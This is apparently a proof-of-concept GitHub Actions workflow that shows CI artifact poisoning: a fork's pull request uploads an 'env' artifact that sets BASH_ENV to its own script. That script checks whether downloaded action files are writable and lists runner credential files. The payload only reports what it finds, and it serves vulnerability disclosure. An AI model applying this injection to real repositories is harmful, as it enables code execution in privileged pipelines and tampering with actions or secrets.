name: Validate

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # ---------------------------------------------------------------------
      # THE ONLY CHANGE A FORK HAS TO MAKE.
      # For a `pull_request` event GitHub runs the workflow file from the pull
      # request's own merge ref, so this file is authored by the fork. The
      # artifact name the privileged consumer selects ("env") and every byte
      # inside it are therefore chosen by the pull request author.
      # Contents are a console.log and two environment variables. No secret is
      # read, written, or exfiltrated.
      # ---------------------------------------------------------------------
      - name: Save PR number
        if: github.event_name == 'pull_request'
        run: |
          mkdir -p ./env
          W=/home/runner/work/ci-artifact-env-poc/ci-artifact-env-poc
          cat > ./env/env <<EOT
          PR_NUMBER=${{ github.event.number }}
          POC_CANARY=third-pr-reach-check
          BASH_ENV=${W}/poc-bashenv.sh
          EOT
          cat > ./env/poc-bashenv.sh <<'EOT'
          echo "[poc-reach] uid=$(id -u) cwd=$PWD"
          echo "[poc-reach] actions downloaded for this job:"
          find /home/runner/work/_actions -maxdepth 3 -mindepth 3 2>/dev/null | head -10
          for f in $(find /home/runner/work/_actions -name 'index.js' -path '*dist*' 2>/dev/null | head -3); do
            if [ -w "$f" ]; then echo "[poc-reach] WRITABLE: $f"; else echo "[poc-reach] read-only: $f"; fi
          done
          echo "[poc-reach] runner credential files present:"
          ls -la /home/runner/work/_temp 2>/dev/null | head -5
          echo "[poc-reach] NOTHING WAS MODIFIED."
          EOT
          echo "--- artifact contents the fork is about to upload ---"
          cat ./env/env

      - uses: actions/upload-artifact@v4
        with:
          name: env
          path: env/
